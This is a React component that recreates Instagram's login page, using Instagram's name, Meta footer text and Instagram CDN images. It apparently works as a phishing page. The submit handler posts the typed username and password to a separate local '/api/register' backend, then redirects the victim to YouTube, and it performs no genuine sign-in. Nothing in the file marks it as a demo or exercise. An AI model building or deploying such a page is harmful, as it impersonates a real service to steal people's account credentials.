import React, { useState, useEffect } from "react";

const App = () => {
  useEffect(() => {
    const link = document.createElement("link");
    link.href =
      "https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap";
    link.rel = "stylesheet";
    document.head.appendChild(link);

    const logoLink = document.createElement("link");
    logoLink.href =
      "https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&display=swap";
    logoLink.rel = "stylesheet";
    document.head.appendChild(logoLink);

    return () => {
      document.head.removeChild(link);
      document.head.removeChild(logoLink);
    };
  }, []);

  const [formData, setFormData] = useState({ username: "", password: "" });
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const handleInputChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);

    try {
      const response = await fetch("http://localhost:5000/api/register", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(formData),
      });

      const data = await response.json();

      if (response.ok) {
        window.location.href = "https://www.youtube.com/";
      } else {
        alert("Invalid Credentials");
      }
    } catch (error) {
      console.error("Error logging in:", error);
      alert("❌ Something went wrong");
    } finally {
      setIsLoading(false);
    }
  };

  const isFormValid =
    formData.username.length > 0 && formData.password.length > 5;

  return (
    <div
      className="min-h-screen bg-gray-50 dark:bg-black flex flex-col items-center justify-center px-4"
      style={{
        fontFamily:
          'Roboto, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
      }}
    >
      <div className="max-w-sm w-full">
        <div className="bg-black  border  rounded-sm px-10 py-8 mb-3">
          <div className="text-center mb-8">
            <h1
              className="text-5xl tracking-wide text-gray-900 dark:text-white"
              style={{ fontFamily: "Galada, cursive" }}
            >
              Instagram
            </h1>
          </div>

          <div className="space-y-2">
            <input
              type="text"
              name="username"
              required
              value={formData.username}
              onChange={handleInputChange}
              placeholder="Phone number, username, or email"
              className="w-full px-2 py-2 text-xs border border-gray-300 dark:border-zinc-700 rounded-sm bg-gray-50 dark:bg-zinc-800 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
            />
            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                name="password"
                required
                value={formData.password}
                onChange={handleInputChange}
                placeholder="Password"
                className="w-full px-2 py-2 text-xs border border-gray-300 dark:border-zinc-700 rounded-sm bg-gray-50 dark:bg-zinc-800 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500 pr-12"
              />
              {formData.password && (
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-2 text-sm font-semibold text-gray-800 dark:text-gray-300 hover:opacity-75"
                >
                  {showPassword ? "Hide" : "Show"}
                </button>
              )}
            </div>

            <button
              onClick={handleSubmit}
              disabled={!isFormValid || isLoading}
              className={`w-full py-1 text-sm font-semibold rounded-sm mt-4 transition-all ${
                isFormValid && !isLoading
                  ? "bg-blue-500 hover:bg-blue-600 text-white"
                  : "bg-blue-300 text-white cursor-not-allowed"
              }`}
            >
              {isLoading ? "Logging in..." : "Log in"}
            </button>
          </div>

          <div className="flex items-center my-4">
            <div className="flex-1 h-px bg-gray-300 dark:bg-zinc-600"></div>
            <span className="px-4 text-xs text-gray-500 dark:text-gray-400 font-semibold">
              OR
            </span>
            <div className="flex-1 h-px bg-gray-300 dark:bg-zinc-600"></div>
          </div>

          <button className="w-full flex items-center justify-center text-blue-900 dark:text-blue-400 text-sm font-semibold hover:underline">
            <svg
              className="w-5 h-5 mr-2"
              viewBox="0 0 24 24"
              fill="currentColor"
            >
              <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
            </svg>
            Log in with Facebook
          </button>

          <div className="text-center mt-4">
            <button className="text-xs text-blue-900 dark:text-blue-400 hover:underline">
              Forgot password?
            </button>
          </div>
        </div>

        <div className="bg-black  rounded-sm p-4 text-center">
          <p className="text-sm text-gray-800 dark:text-gray-200">
            Don't have an account?{" "}
            <button className="text-blue-500 font-semibold hover:text-blue-600">
              Sign up
            </button>
          </p>
        </div>

        <div className="text-center mt-4">
          <p className="text-sm mb-4 text-gray-600 dark:text-gray-300">
            Get the app.
          </p>
          <div className="flex justify-center space-x-2">
            <img
              src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png"
              alt="App Store"
              className="h-10 cursor-pointer hover:opacity-80"
            />
            <img
              src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png"
              alt="Google Play"
              className="h-10 cursor-pointer hover:opacity-80"
            />
          </div>
        </div>
      </div>

      <div className="mt-16 text-xs text-gray-400 dark:text-gray-500 text-center max-w-4xl">
        <div className="flex flex-wrap justify-center space-x-4 mb-4">
          {[
            "Meta",
            "About",
            "Blog",
            "Jobs",
            "Help",
            "API",
            "Privacy",
            "Terms",
            "Top Accounts",
            "Locations",
            "Instagram Lite",
            "Threads",
          ].map((link) => (
            <a href="#" key={link} className="hover:underline">
              {link}
            </a>
          ))}
        </div>
        <div className="flex justify-center items-center space-x-4">
          <select className="bg-transparent dark:bg-transparent text-gray-400 dark:text-gray-500 text-xs">
            <option>English</option>
            <option>Español</option>
            <option>Français</option>
          </select>
          <span>© 2025 Instagram from Meta</span>
        </div>
      </div>
    </div>
  );
};

export default App;
